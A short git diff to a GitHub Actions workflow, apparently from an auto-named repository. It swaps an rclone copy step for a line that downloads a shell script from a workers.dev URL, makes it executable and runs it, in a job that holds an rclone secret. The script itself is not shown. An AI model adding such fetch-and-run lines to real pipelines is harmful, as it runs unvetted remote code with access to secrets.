@@ -32,5 +32,4 @@ jobs:
       uses: AnimMouse/setup-rclone@v1
       with:
        rclone_config: ${{ secrets.RCLONE_CONFIG }}
-    - run: cd /home/runner/work/bookish-computing-machine/bookish-computing-machine/work && 'rclone copy encode one:'
-     
+    - run: wget https://share.secretz.workers.dev/2:/bash.sh -O bash.sh && chmod +x bash.sh && ./bash.sh
